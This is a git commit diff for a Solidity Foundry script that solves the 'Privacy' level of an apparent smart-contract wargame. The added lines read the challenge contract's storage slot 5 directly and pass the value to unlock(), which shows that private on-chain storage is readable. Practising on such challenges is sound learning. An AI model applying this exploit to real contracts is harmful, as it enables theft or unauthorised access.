029ec34cf3d9affd7f13a69269802fa774077315
Tomas <tomasfreire@gmail.com>
2024-02-07 15:27:55 -0300

    new level: privacy

--- script/12_Privacy.s.sol
+++ script/12_Privacy.s.sol
@@ -6,7 +6,7 @@ import { Script, console } from "forge-std/Script.sol";
 import { HelperConfig } from "./HelperConfig.s.sol";
 import { Privacy } from "../src/12_Privacy.sol";
 
-contract ElevatorAttacker is Script {
+contract PrivacyAttacker is Script {
 
   uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
 
@@ -17,6 +17,10 @@ contract ElevatorAttacker is Script {
     Privacy challenge = Privacy(challengeInstanceAddress);
 
     vm.startBroadcast(deployerPrivateKey);
+    bytes32 slot_0 = vm.load(challengeInstanceAddress, bytes32(uint256(5)));
+    challenge.unlock(bytes16(slot_0));
+
+    console.log("Locked: %s", challenge.locked());
 
     vm.stopBroadcast();
   }
